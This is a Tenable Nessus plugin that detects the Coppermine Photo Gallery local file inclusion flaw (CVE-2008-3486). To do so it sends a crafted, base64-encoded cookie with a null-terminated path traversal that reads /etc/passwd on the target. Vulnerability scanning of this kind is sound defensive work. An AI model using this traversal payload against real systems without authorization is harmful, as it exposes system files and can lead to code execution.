#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(33789);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2008-3486");
  script_bugtraq_id(30480);
  script_xref(name:"milw0rm", value:"6178");
  script_xref(name:"OSVDB", value:"47250");
  script_xref(name:"Secunia", value:"31295");

  script_name(english:"Coppermine Photo Gallery include/functions.inc.php _data Cookie lang Variable Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application that is affected by a\n",
      "local file include vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The version of Coppermine installed on the remote host fails to\n",
      "sanitize input to the 'lang' array element of its data cookie before\n",
      "using it in 'include/init.inc.php' to include PHP code.  Provided the\n",
      "application's character set is set to 'utf-8', which it is by default,\n",
      "an unauthenticated remote attacker can exploit this issue to view\n",
      "arbitrary files or possibly to execute arbitrary PHP code on the\n",
      "remote host, subject to the privileges of the web server user id."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://forum.coppermine-gallery.net/index.php/topic,54235.0.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Upgrade to Coppermine Photo Gallery 1.4.19 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("coppermine_gallery_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


file = "/../../../../../../../../../../../../etc/passwd";
file_pat = "root:.*:0:[01]:";


# Test an install.
install = get_kb_item(string("www/", port, "/coppermine_photo_gallery"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
init_cookiejar();
if (!isnull(matches))
{
  dir = matches[2];
  url = string(dir, "/index.php");

  # Determine the cookie name.
  r = http_send_recv3(method: 'GET', item:url, port:port);

  cookie_name = NULL;
  cookie_val = NULL;

    data = string(
      'a:3:{',
        's:2:"ID";s:32:"', hexstr(MD5(unixtime())), '";',
        's:2:"am";i:1;',
        's:4:"lang";s:', strlen(file)+1, ':"', file, '\x00', '";',
      '}'
    );
  nk = replace_http_cookies(name_re: '^.*_data$', new_value: base64(str:data));
  # Try to exploit the vulnerability to read a file.
  if (! nk)
  {
      debug_print("couldn't find the data cookie!\n");
  }
  else
  {
    rq2 = http_mk_get_req(port:port, item: url);
    r =  http_send_recv_req(port:port, req: rq2);
    if (isnull(r)) exit(0);

    # There's a problem if there's an entry for root.
    if (egrep(pattern:file_pat, string: r[2]))
    {
      if (report_verbosity)
      {
        output = "";
        if ("<!DOCTYPE" >< r[2]) output = r[2] - strstr(r[2], "<!DOCTYPE");
        if (!egrep(pattern:file_pat, string:output)) output = r[2];

        report = string(
          "\n",
          "Nessus was able to retrieve the contents of '", str_replace(find:"/..", replace:"", string:file), "' on the\n",
          "remote host by sending the following request :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', 
	     		string: http_mk_buffer_from_req(req: rq2))
        );
        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here are the contents :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:output), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
  }
}
